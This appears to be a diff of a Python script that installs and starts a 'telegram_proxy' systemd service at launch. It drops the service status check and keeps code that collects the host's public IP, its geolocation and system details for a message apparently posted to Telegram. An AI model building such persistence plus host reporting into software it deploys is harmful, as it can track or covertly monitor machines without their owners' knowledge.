@@ -168,24 +168,10 @@ def setup_autostart():
     subprocess.run(["systemctl", "enable", "telegram_proxy.service"])
     subprocess.run(["systemctl", "start", "telegram_proxy.service"])
 
-    # Проверка, что сервис активен
-    return check_autostart_status()
-
-def check_autostart_status():
-    try:
-        status = subprocess.run(["systemctl", "is-active", "telegram_proxy.service"], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        if status.returncode == 0 and status.stdout.strip() == 'active':
-            return '✅'  # Успех
-        else:
-            return '❌'  # Ошибка
-    except subprocess.CalledProcessError as e:
-        print(f"Error checking autostart status: {e}")
-        return '❌'  # Ошибка
-
 if __name__ == '__main__':
     # Получаем публичный IP
     public_ip = get_public_ip()
-
+    setup_autostart()
     if public_ip:
         # Получаем геолокацию по IP
         country, city = get_ip_geolocation(public_ip)
@@ -195,9 +181,6 @@ if __name__ == '__main__':
 
         # Хешируем публичный IP для добавления в хештег
         hashed_ip = hash_ip(public_ip)
-
-        # Проверяем статус автозапуска и получаем иконку
-        autostart_status_icon = setup_autostart()
 
         # Составляем первое сообщение
         initial_message = f"""
@@ -211,7 +194,6 @@ if __name__ == '__main__':
         📊 **System Information:**
         {system_info}
         
-        🚀 **Autostart Status**: {autostart_status_icon}
         #{hashed_ip}
         """
 
